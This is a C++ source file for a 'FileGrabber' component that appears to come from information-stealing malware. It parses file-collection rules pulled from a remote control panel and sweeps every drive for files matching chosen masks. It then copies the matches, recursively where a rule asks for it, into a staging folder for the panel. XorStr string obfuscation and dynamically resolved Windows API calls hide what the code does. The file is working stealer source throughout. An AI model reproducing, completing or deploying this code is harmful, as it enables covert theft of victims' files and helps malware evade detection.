#include "Common.h"

bool FileGrabber::GetRules(string response)
{
	string config = response.substr(1).substr(0, response.size() - 2);

	vector<string> raw_rules = Utils::splitBy(config, '|');

	if (!raw_rules.empty())
	{
		for (size_t i = 0; i < raw_rules.size(); ++i)
		{
			const string query = raw_rules[i].substr(1).substr(0, raw_rules[i].size() - 2);

			vector<string> temp = Utils::splitBy(query, ';', true);
			if (temp.size() >= 5)
			{
				FileGrabberRule rule;
				rule.Path = Utils::splitBy(temp[0], '|');

				vector<string> vecPathes;
				for (string& str : rule.Path)
				{
					bool ext = false;
					str = Utils::replaceEnvVar(str, &ext);
					if (ext)
					{
						DWORD dwLogicalDrives = API(KERNEL32, GetLogicalDrives)();
						string drive = XorStr("A:");
						string temp_query = string();
						size_t idx = str.find('\\');
						if (idx != string::npos)
							temp_query = str.substr(idx);
						while (dwLogicalDrives != 0)
						{
							if (dwLogicalDrives & 1)
							{
								if (drive[0] != 'C')
									vecPathes.push_back(drive + temp_query);
							}

							++drive[0];
							dwLogicalDrives >>= 1;
						}
					}
				}
				rule.Mask = Utils::splitBy(Utils::trimStr(temp[1], ' '), ',');

				temp[2] = Utils::trimStr(temp[2], ' ');
				if (!temp[2].empty() && Utils::isNumeric(temp[2]))
					rule.MaxFileSize = (unsigned int)Utils::str2ull(temp[2]);
				else
					rule.MaxFileSize = 0;
				rule.Domains = Utils::splitBy(Utils::trimStr(temp[3], ' '), ',');
				rule.Exceptions = Utils::splitBy(Utils::trimStr(temp[4], ' '), ',');
				rule.bRecursive = BOOL_STR(temp[5]);

				if (!vecPathes.empty())
				{
					for (string& pth : vecPathes)
						rule.Path.push_back(pth);
				}

				fileGrabberRules.push_back(rule);
			}
		}
	}
	raw_rules.clear();

	if (!fileGrabberRules.empty()) return true;
	return false;
}

void FileGrabber::ProcessDomains(const vector<string>& domains)
{
	for (FileGrabberRule& rule : fileGrabberRules)
	{
		if (!rule.Domains.empty())
		{
			bool bFound = false;
			for (string domain : domains)
			{
				if (bFound) break;
				if (Utils::contains_record(domains, domain)) bFound = true;
			}
			rule.bActive = bFound;
		}
	}
}

void FileGrabber::CopyByMask(string path, string mask, size_t maxFileSize, const vector<string>& exceptions)
{
	if (this->MaxFilesSize && SumFileSizes >= MaxFilesSize) return;

	WIN32_FIND_DATA data;
	HANDLE hFind = API(KERNEL32, FindFirstFileA)((path + '\\' + mask).c_str(), &data);
	if (hFind == INVALID_HANDLE_VALUE) return;

	string file_name = string();
	do
	{
		if (data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;

		file_name = data.cFileName;
		WIN32_FILE_ATTRIBUTE_DATA fad;
		if (maxFileSize != 0 && API(KERNEL32, GetFileAttributesExA)((path + '\\' + file_name).c_str(), GetFileExInfoStandard, &fad))
		{
			LARGE_INTEGER liSize;
			liSize.HighPart = fad.nFileSizeHigh;
			liSize.LowPart = fad.nFileSizeLow;
			unsigned long long currentFileSize = liSize.QuadPart;

			if (currentFileSize >= maxFileSize) continue;
			if (this->MaxFilesSize != 0) this->SumFileSizes += currentFileSize;
		}

		if (!exceptions.empty())
		{
			bool blackListed = false;
			for (string exep : exceptions)
			{
				if (file_name.find(exep) != string::npos)
				{
					blackListed = true;
					break;
				}
			}

			if (blackListed) continue;
		}

		panel->AddFileFromDisk(path + '\\' + file_name, this->output_dir + (path.substr(this->currentPath.size())) +'\\' + file_name);
	} while (API(KERNEL32, FindNextFileA)(hFind, &data));
	API(KERNEL32, FindClose)(hFind);
}

void FileGrabber::CopyByMaskRecursive(string path, string mask, size_t maxFileSize, const vector<string>& exceptions)
{
	WIN32_FIND_DATA data;
	HANDLE hFind = API(KERNEL32, FindFirstFileA)((path + XorStr("\\*")).c_str(), &data);
	if (hFind == INVALID_HANDLE_VALUE) return;

	string file_name = string();
	CopyByMask(path, mask, maxFileSize, exceptions);
	do
	{
		file_name = data.cFileName;
		if (data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			if (file_name == XorStr(".") || file_name == XorStr("..")) continue;

			if (!exceptions.empty())
			{
				bool blackListed = false;
				for (string exep : exceptions)
				{
					if (file_name.find(exep) != string::npos)
					{
						blackListed = true;
						break;
					}
				}

				if (blackListed) continue;
			}

			CopyByMaskRecursive(path + '\\' + file_name, mask, maxFileSize, exceptions);
		}
	} while (API(KERNEL32, FindNextFileA)(hFind, &data));

	API(KERNEL32, FindClose)(hFind);
}

void FileGrabber::Grab()
{
	for (FileGrabberRule& rule : fileGrabberRules)
	{
		if (!rule.bActive) continue;

		for (string& path : rule.Path)
		{
			this->currentPath = path;
			for (string& ext : rule.Mask)
			{
				if (rule.bRecursive)
					CopyByMaskRecursive(path, ext, rule.MaxFileSize, rule.Exceptions);
				else
					CopyByMask(path, ext, rule.MaxFileSize, rule.Exceptions);
			}
		}
	}
}
